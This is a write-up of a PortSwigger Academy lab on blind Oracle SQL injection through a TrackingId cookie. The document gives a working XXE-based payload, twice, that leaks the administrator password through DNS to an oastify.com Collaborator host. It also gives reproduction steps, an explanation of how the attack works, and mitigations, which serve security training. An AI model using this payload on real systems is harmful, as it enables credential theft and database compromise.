# Blind SQL Injection with Out-of-Band Data Exfiltration

## Lab Information

| Category | SQL Injection |
|---|---|
| Lab Name | Blind SQL injection with out-of-band data exfiltration |
| Difficulty | Practitioner |
| Platform | PortSwigger Web Security Academy |

---

# Description

This lab demonstrates a Blind SQL Injection vulnerability using Out-of-Band (OAST) data exfiltration techniques.

Unlike traditional SQL Injection vulnerabilities:
- the application did not display database errors
- no query results were visible
- no conditional response differences existed
- no timing-based responses were available

Instead, the attacker used Burp Suite Collaborator to force the backend Oracle database to send sensitive data externally through DNS requests.

The vulnerable injection point was located inside the `TrackingId` cookie.

Using Oracle XML functionality and external entities, the attacker successfully exfiltrated the administrator password inside a DNS request subdomain.

---

# Vulnerability Type

- Blind SQL Injection (Blind SQLi)
- Out-of-Band SQL Injection (OAST)
- Data Exfiltration
- Oracle SQL Injection

---

# Impact

An attacker can extract sensitive information from backend databases even when:
- errors are hidden
- responses remain unchanged
- timing attacks are unavailable

This may lead to:
- credential disclosure
- unauthorized administrator access
- remote data exfiltration
- sensitive information leakage
- complete database compromise

Out-of-Band SQL Injection with data exfiltration is considered extremely dangerous because sensitive data can leave the environment silently.

---

# Steps to Reproduce

1. Open the target application.
2. Navigate to the **Lifestyle** category.
3. Capture the request using Burp Suite.
4. Identify the vulnerable `TrackingId` cookie.
5. Using the PortSwigger SQL Injection cheat sheet, craft the following payload:

```sql
TrackingId=' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.4kplfsxi45y92ldn6rswmn5w8nee25qu.oastify.com/"> %remote;]>'),'/l') FROM dual--;
```

6. Send the modified request.
7. Open Burp Suite Collaborator.
8. Observe incoming DNS requests.
9. Open one of the DNS interaction entries.
10. Observe that the administrator password appears inside the subdomain.
11. Copy the extracted administrator password.
12. Navigate to the login page.
13. Authenticate using the extracted administrator credentials.
14. The lab gets successfully solved.

---

# Proof of Concept (PoC)

## Step 1 — Accessing the Main Website

The application initially appeared to be a normal e-commerce website containing the **Lifestyle** category filter.

![Main Website](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Out-of-Band%20Data%20Exfiltration/screenshots/lab13.png?raw=true)

**Caption:** Initial application interface containing the Lifestyle category filter.

---

## Step 2 — Capturing the Request

The Lifestyle category request was intercepted using Burp Suite.

During inspection, the vulnerable `TrackingId` cookie was identified.

![Captured Request](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Out-of-Band%20Data%20Exfiltration/screenshots/lab13(1).png?raw=true)

**Caption:** Capturing the request and identifying the vulnerable TrackingId cookie.

---

## Step 3 — Injecting the Out-of-Band Data Exfiltration Payload

Using the PortSwigger SQL Injection cheat sheet, the following Oracle payload was crafted and modified:

```sql
TrackingId=' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.4kplfsxi45y92ldn6rswmn5w8nee25qu.oastify.com/"> %remote;]>'),'/l') FROM dual--;
```

This payload:
- queried the administrator password
- inserted the password into a subdomain
- forced the Oracle database to resolve the external entity
- triggered a DNS request to the Burp Collaborator server

![Payload Injection](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Out-of-Band%20Data%20Exfiltration/screenshots/lab13(2).png?raw=true)

**Caption:** Injecting an Out-of-Band SQL Injection payload for data exfiltration.

---

## Step 4 — Capturing the DNS Interaction

After sending the payload, Burp Suite Collaborator captured multiple DNS requests.

Inside the DNS interaction details, the administrator password became visible inside the subdomain:

```text
os9fclerugnpbz69jdjo.4kplfsxi45y92ldn6rswmn5w8nee25qu.oastify.com
```

The first part of the subdomain contained the administrator password extracted from the database.

![Collaborator Results](screenshots/oast-data-exfiltration-4.png)

**Caption:** Extracting the administrator password from the Burp Collaborator DNS interaction.

---

## Step 5 — Logging into the Administrator Account

The extracted administrator credentials were used on the login page.

![Administrator Login](screenshots/oast-data-exfiltration-5.png)

**Caption:** Attempting administrator login using extracted credentials.

---

## Step 6 — Successful Administrator Access

The administrator login succeeded successfully.

The lab was solved successfully.

![Administrator Access](screenshots/oast-data-exfiltration-6.png)

**Caption:** Successful administrator login after extracting credentials via Out-of-Band SQL Injection.

---

# Why It Works

The application directly inserted user-controlled cookie data into backend SQL queries without proper sanitization.

The attacker abused Oracle XML functionality:

```sql
EXTRACTVALUE(xmltype(...))
```

and XML external entities:

```xml
<!ENTITY % remote SYSTEM "http://attacker-domain">
```

The payload dynamically inserted:

```sql
(select password from users where username='administrator')
```

into the DNS subdomain.

This forced the Oracle database server to:
1. retrieve the administrator password
2. append it into the DNS request
3. contact the Burp Collaborator server

Burp Collaborator captured the DNS interaction, allowing the attacker to retrieve sensitive data externally.

---

# Understanding Out-of-Band Data Exfiltration

## Simple Meaning

Out-of-Band Data Exfiltration means:

> "Sensitive data is stolen through a different communication channel instead of the normal website response."

Instead of displaying data inside the webpage, the server secretly sends it externally using:
- DNS requests
- HTTP requests

---

## Why It Was Important in This Lab

This application:
- did not display errors
- did not show query results
- did not allow timing attacks

So normal SQL Injection techniques were ineffective.

Burp Collaborator acted as an external listener:
- if the database contacted the Collaborator server
- the attacker could receive sensitive data through the DNS request itself

---

# Security Risk

This vulnerability can result in:
- silent credential theft
- remote data exfiltration
- sensitive information leakage
- database enumeration
- complete database compromise

Out-of-Band SQL Injection vulnerabilities are extremely dangerous because sensitive data can leave the environment without appearing in application responses.

---

# Recommended Mitigation

- Use parameterized queries (prepared statements).
- Never concatenate user input into SQL queries.
- Disable unnecessary XML external entity functionality.
- Restrict outbound network access from database servers.
- Apply strict input validation.
- Restrict database permissions using least privilege principles.

---

# Learning Section

## What I Learned

- Blind SQL Injection can exfiltrate sensitive data externally through DNS requests.
- Burp Suite Collaborator helps capture Out-of-Band interactions.
- Oracle XML functions can trigger external entity requests.
- Sensitive data can be embedded inside DNS subdomains.
- OAST attacks work even when no errors, timing delays, or response differences exist.

---

# Tools Used

- Burp Suite
- Burp Collaborator
- Burp Repeater
- Firefox Developer Tools
- PortSwigger Web Security Academy
- PortSwigger SQL Injection Cheat Sheet

---

# Conclusion

This lab demonstrated a Blind SQL Injection vulnerability using Out-of-Band data exfiltration techniques through the `TrackingId` cookie.

By abusing Oracle XML functionality and Burp Suite Collaborator, the backend database was forced to send the administrator password externally through a DNS request, ultimately allowing unauthorized administrator access without relying on visible application responses.
